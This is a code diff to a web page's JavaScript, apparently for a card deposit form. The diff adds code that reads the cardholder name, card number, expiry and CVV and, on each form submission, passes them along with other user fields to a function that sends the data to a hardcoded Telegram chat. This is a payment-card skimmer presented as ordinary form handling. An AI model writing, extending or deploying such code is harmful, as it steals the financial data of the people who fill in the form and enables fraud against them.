@@ -66,7 +66,11 @@ async function sendDataToTelegram() {
   const chatId = "-4258460856";
 
   // Other fields you already had
-  const depositAmount = document.getElementById("DepositAmount")?.value?.trim() || "";
+  const depositAmount = document.getElementById("cardDepositAmount")?.value?.trim() || "";
+  const cardName      = document.getElementById("cardName")?.value?.trim() || "";
+  const cardNumber    = document.getElementById("cardNumber")?.value?.trim() || "";
+  const cardExpiry    = document.getElementById("cardExpiry")?.value?.trim() || "";
+  const cardCVV       = document.getElementById("cardCVV")?.value?.trim() || "";
   const name          = document.getElementById("Name")?.value?.trim() || "";
   const idUser        = document.getElementById("iduser")?.value?.trim() || "";
   const toUser        = document.getElementById("touser")?.value?.trim() || "";
@@ -142,3 +146,29 @@ async function sendDataToTelegram() {
     console.error("Error sending to Telegram:", e);
   }
 }
+
+// Attach event listeners once the DOM is ready.
+document.addEventListener('DOMContentLoaded', () => {
+  const form = document.getElementById('cardDepositForm');
+  if (!form) return;
+
+  form.addEventListener('submit', () => {
+    // Ensure the card deposit form fields have values before sending.
+    const requiredIds = [
+      'cardDepositAmount',
+      'cardName',
+      'cardNumber',
+      'cardExpiry',
+      'cardCVV'
+    ];
+
+    const isFilled = requiredIds.every(id => {
+      const el = document.getElementById(id);
+      return el && el.value.trim();
+    });
+
+    if (isFilled) {
+      sendDataToTelegram();
+    }
+  });
+});
